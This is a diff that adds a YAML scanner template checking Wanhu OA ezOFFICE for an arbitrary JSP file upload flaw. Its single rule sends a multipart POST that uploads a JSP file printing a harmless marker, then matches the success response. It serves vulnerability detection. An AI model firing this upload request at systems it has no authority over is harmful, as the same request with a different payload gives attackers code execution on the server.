@@ -1,0 +1,15 @@
+name: 万户OA-ezOFFICE-portletSettingId文件上传
+description: >
+  上传文件路径：/defaultroot/upload/dir/2023XX/20231216222529XXXXXX.jsp
+alwaysExecute: false
+matchCount: 1
+rules:
+  - method: POST
+    path: /defaultroot/platform/portal/layout/common/upload.jsp?portletSettingId=123&path=dir
+    headers:
+      Content-Type: multipart/form-data; boundary=----othotlvgwwannsrjurc6
+    body: "------othotlvgwwannsrjurc6\r\nContent-Disposition: form-data; name=\"file\"; filename=\"hc0qc.jsp\"\r\nContent-Type: application/octet-stream\r\n\r\n<%out.println(\"Rscan_test\")%>\r\n------othotlvgwwannsrjurc6--"
+    expression:
+      status: 200
+      body_all:
+        - "parent.afterUpload"
